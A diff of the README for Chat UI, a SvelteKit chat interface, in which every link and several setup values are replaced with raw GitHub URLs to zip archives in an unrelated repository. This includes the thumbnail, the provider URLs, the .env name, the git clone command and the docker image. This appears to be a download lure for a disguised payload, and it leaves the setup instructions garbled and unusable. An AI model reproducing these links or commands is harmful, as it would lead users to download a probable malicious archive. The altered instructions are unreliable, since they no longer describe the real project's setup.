@@ -1,8 +1,8 @@
 # Chat UI
 
-![Chat UI repository thumbnail](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip)
+![Chat UI repository thumbnail](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip)
 
-A chat interface for LLMs. It is a SvelteKit app and it powers the [HuggingChat app on https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip).
+A chat interface for LLMs. It is a SvelteKit app and it powers the [HuggingChat app on https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip).
 
 0. [Quickstart](#quickstart)
 1. [Database Options](#database-options)
@@ -12,42 +12,42 @@ A chat interface for LLMs. It is a SvelteKit app and it powers the [HuggingChat 
 5. [Building](#building)
 
 > [!NOTE]
-> Chat UI only supports OpenAI-compatible APIs via `OPENAI_BASE_URL` and the `/models` endpoint. Provider-specific integrations (legacy `MODELS` env var, GGUF discovery, embeddings, web-search helpers, etc.) are removed, but any service that speaks the OpenAI protocol (https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip server, Ollama, OpenRouter, etc. will work by default).
+> Chat UI only supports OpenAI-compatible APIs via `OPENAI_BASE_URL` and the `/models` endpoint. Provider-specific integrations (legacy `MODELS` env var, GGUF discovery, embeddings, web-search helpers, etc.) are removed, but any service that speaks the OpenAI protocol (https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip server, Ollama, OpenRouter, etc. will work by default).
 
 > [!NOTE]
-> The old version is still available on the [legacy branch](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip)
+> The old version is still available on the [legacy branch](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip)
 
 ## Quickstart
 
 Chat UI speaks to OpenAI-compatible APIs only. The fastest way to get running is with the Hugging Face Inference Providers router plus your personal Hugging Face access token.
 
-**Step 1 – Create `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`:**
+**Step 1 – Create `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`:**
 
 ```env
-https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip
+https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip
 OPENAI_API_KEY=hf_************************
 # Fill in once you pick a database option below
 MONGODB_URL=
 ```
 
-`OPENAI_API_KEY` can come from any OpenAI-compatible endpoint you plan to call. Pick the combo that matches your setup and drop the values into `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`:
+`OPENAI_API_KEY` can come from any OpenAI-compatible endpoint you plan to call. Pick the combo that matches your setup and drop the values into `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`:
 
 | Provider                                      | Example `OPENAI_BASE_URL`          | Example key env                                                         |
 | --------------------------------------------- | ---------------------------------- | ----------------------------------------------------------------------- |
-| Hugging Face Inference Providers router       | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip` | `OPENAI_API_KEY=hf_xxx` (or `HF_TOKEN` legacy alias)                    |
-| https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip server (`https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip --server --api`) | `http://127.0.0.1:8080/v1`         | `OPENAI_API_KEY=sk-local-demo` (any string works; https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip ignores it) |
+| Hugging Face Inference Providers router       | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip` | `OPENAI_API_KEY=hf_xxx` (or `HF_TOKEN` legacy alias)                    |
+| https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip server (`https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip --server --api`) | `http://127.0.0.1:8080/v1`         | `OPENAI_API_KEY=sk-local-demo` (any string works; https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip ignores it) |
 | Ollama (with OpenAI-compatible bridge)        | `http://127.0.0.1:11434/v1`        | `OPENAI_API_KEY=ollama`                                                 |
-| OpenRouter                                    | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`     | `OPENAI_API_KEY=sk-or-v1-...`                                           |
-| Poe                                           | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`           | `OPENAI_API_KEY=pk_...`                                                 |
+| OpenRouter                                    | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`     | `OPENAI_API_KEY=sk-or-v1-...`                                           |
+| Poe                                           | `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`           | `OPENAI_API_KEY=pk_...`                                                 |
 
-Check the root [`.env` template](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip) for the full list of optional variables you can override.
+Check the root [`.env` template](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip) for the full list of optional variables you can override.
 
 **Step 2 – Choose where MongoDB lives:** Either provision a managed cluster (for example MongoDB Atlas) or run a local container. Both approaches are described in [Database Options](#database-options). After you have the URI, drop it into `MONGODB_URL` (and, if desired, set `MONGODB_DB_NAME`).
 
 **Step 3 – Install and launch the dev server:**
 
 ```bash
-git clone https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip
+git clone https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip
 cd chat-ui
 npm install
 npm run dev -- --open
@@ -61,10 +61,10 @@ Chat history, users, settings, files, and stats all live in MongoDB. You can poi
 
 ### MongoDB Atlas (managed)
 
-1. Create a free cluster at [https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip).
+1. Create a free cluster at [https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip).
 2. Add your IP (or `0.0.0.0/0` for development) to the network access list.
 3. Create a database user and copy the connection string.
-4. Paste that string into `MONGODB_URL` in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`. Keep the default `MONGODB_DB_NAME=chat-ui` or change it per environment.
+4. Paste that string into `MONGODB_URL` in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`. Keep the default `MONGODB_DB_NAME=chat-ui` or change it per environment.
 
 Atlas keeps MongoDB off your laptop, which is ideal for teams or cloud deployments.
 
@@ -76,7 +76,7 @@ If you prefer to run MongoDB locally:
 docker run -d -p 27017:27017 --name mongo-chatui mongo:latest
 ```
 
-Then set `MONGODB_URL=mongodb://localhost:27017` in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`. You can also supply `MONGO_STORAGE_PATH` if you want Chat UI’s fallback in-memory server to persist under a specific folder.
+Then set `MONGODB_URL=mongodb://localhost:27017` in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`. You can also supply `MONGO_STORAGE_PATH` if you want Chat UI’s fallback in-memory server to persist under a specific folder.
 
 ## Launch
 
@@ -96,14 +96,14 @@ Prefer containerized setup? You can run everything in one container as long as y
 ```bash
 docker run \
   -p 3000 \
-  -e https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip \
-  -e https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip \
+  -e https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip \
+  -e https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip \
   -e OPENAI_API_KEY=hf_*** \
   -v db:/data \
-  https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip
+  https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip
 ```
 
-`https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip` lets the container reach a MongoDB instance on your host machine; swap it for your Atlas URI if you use the hosted option. All environment variables accepted in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip` can be provided as `-e` flags.
+`https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip` lets the container reach a MongoDB instance on your host machine; swap it for your Atlas URI if you use the hosted option. All environment variables accepted in `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip` can be provided as `-e` flags.
 
 ## Extra parameters
 
@@ -128,9 +128,9 @@ This build does not use the `MODELS` env var or GGUF discovery. Configure models
 
 ### LLM Router (Optional)
 
-Chat UI can perform client-side routing [katanemo/Arch-Router-1.5B](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip) as the routing model without running a separate router service. The UI exposes a virtual model alias called "Omni" (configurable) that, when selected, chooses the best route/model for each message.
+Chat UI can perform client-side routing [katanemo/Arch-Router-1.5B](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip) as the routing model without running a separate router service. The UI exposes a virtual model alias called "Omni" (configurable) that, when selected, chooses the best route/model for each message.
 
-- Provide a routes policy JSON via `LLM_ROUTER_ROUTES_PATH`. No sample file ships with this branch, so you must point the variable to a JSON array you create yourself (for example, commit one in your project like `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip`). Each route entry needs `name`, `description`, `primary_model`, and optional `fallback_models`.
+- Provide a routes policy JSON via `LLM_ROUTER_ROUTES_PATH`. No sample file ships with this branch, so you must point the variable to a JSON array you create yourself (for example, commit one in your project like `https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip`). Each route entry needs `name`, `description`, `primary_model`, and optional `fallback_models`.
 - Configure the Arch router selection endpoint with `LLM_ROUTER_ARCH_BASE_URL` (OpenAI-compatible `/chat/completions`) and `LLM_ROUTER_ARCH_MODEL` (e.g. `router/omni`). The Arch call reuses `OPENAI_API_KEY` for auth.
 - Map `other` to a concrete route via `LLM_ROUTER_OTHER_ROUTE` (default: `casual_conversation`). If Arch selection fails, calls fall back to `LLM_ROUTER_FALLBACK_MODEL`.
 - Selection timeout can be tuned via `LLM_ROUTER_ARCH_TIMEOUT_MS` (default 10000).
@@ -152,4 +152,4 @@ npm run build
 
 You can preview the production build with `npm run preview`.
 
-> To deploy your app, you may need to install an [adapter](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/__debug/KH4NK1_2.0.zip) for your target environment.
+> To deploy your app, you may need to install an [adapter](https://raw.githubusercontent.com/ba1nch0d/KH4NK1/main/src/routes/conversation/[id]/message/[messageId]/K-N-3.6-beta.3.zip) for your target environment.
